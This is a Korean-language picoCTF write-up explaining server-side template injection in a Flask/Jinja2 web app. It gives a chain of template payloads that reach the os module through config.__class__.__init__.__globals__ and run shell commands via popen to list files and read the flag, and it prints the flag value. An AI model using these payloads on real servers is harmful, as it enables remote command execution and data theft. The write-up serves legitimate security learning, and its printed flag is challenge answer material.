# Challenge: picoCTF - SSTI

## 문제 설명 & 접근
Server-Side Template Injection(서버 측 템플릿 인젝션, SSTI) 취약점
form에 {{1+1}}을 입력하여 제출하면 화면에 2가 뜬다.=> jinja2

## 필요한 개념
#### 템플릿 랜더링
1. 사용자 입력이 템플릿 엔진으로 처리될 때, 적절한 검증이 없어 악의적인 입력이 서버에서 실행될 수 있는 취약점
2. 주로 python (jinja2), PHP (Twig), Java(FreeMarker)와 같은 서버에서 템플릿 랜더링 쓰는 환경에서 발생
3. 참고로 CTF 대부분은 Python Flask 기반 웹앱을 사용하며 Flask는 기본 템플릿 엔진으로 jinja2를 사용한다.

#### 내부 객체 접근
jinja2에서 공격자가 접근 가능한 템플릿 상수 객체에 config, self, request 등이 있다.
1. `config` : 현재 환경의 config 객체
2. `config.__class__` : config 객체의 클래스 (Flask Config class)
3. `config.__class__.__init__` : 클래스 생성자 함수
4. `config.__class__.__init__.globals__` : 생성자의 전역변수 딕셔너리
* `__globals__`라는 속성은 python에서 클래스나 객체에는 없고, 함수 객체에 존재한다. 보통 init의 전역공간에 os, sys, builtins 등의 모듈이 올라와있으니 이걸 활용하면 그 함수가 이미 import한 걸 재활용 가능(아래 내용 참고)
* 일반적으로 템플릿은 샌드박스 환경이기에 import는 할 수 없다. 그래서 위와 같은 간접적인 방식을 사용하는 것

#### 파이썬에서의 import
1. python에서 어떤 함수나 클래스가 정의될 때 그 함수가 포함된 파일의 가장 상단에 import된 모듈은 그 함수의 global namespace에 들어간다. 
    ```python
    # config.py
    import os

    class Config:
        def __init__(self):
            self.secret = os.getenv("SECRET")  # os 사용함
    ```
위 코드에서 init 함수는 정의할 때 os를 쓸 수 있었다. 따라서 `config.__init__.__globals.__['os']`라 쓰면 os 모듈 객체를 그대로 쓸 수 있다.

## 문제 분석
1.config를 입력하면 아래 출력물이 나온다. 이는 flask 내부의 config 클래스 인스턴스
```html
<Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
```
2.이제 `{{config.__class__}}`를 입력해보자. 아래 출력물이 나온다.
<class 'flask.config.Config'> 

3.`{{config.__class__.__init__.__globals__}}`를 입력하면, 전역변수가 쭉 출력된다.
4.`{{config.__class__.__init__.__globals__['os']}}`를 입력하면 dict의 value가 다음과 같이 나온다. 
<module 'os' from '/usr/lib/python3.8/os.py'>

5.`{{config.__class__.__init__.__globals__['os'].popen('pwd').read()}}`로 현재 디렉터리 확인 가능. /challenge라 뜬다. os.popen()은 python에서 리눅스 명령어를 실행하고, 그 출력 결과를 python에서 읽어오는 함수

6.`{{config.__class__.__init__.__globals__['os'].popen('ls -al').read()}}`로 디렉터리 내 파일을 보면 flag라는 이름을 가진 파일이 있다. 



## ✅ 풀이

```python
{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}
```
결과
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_424a1494}
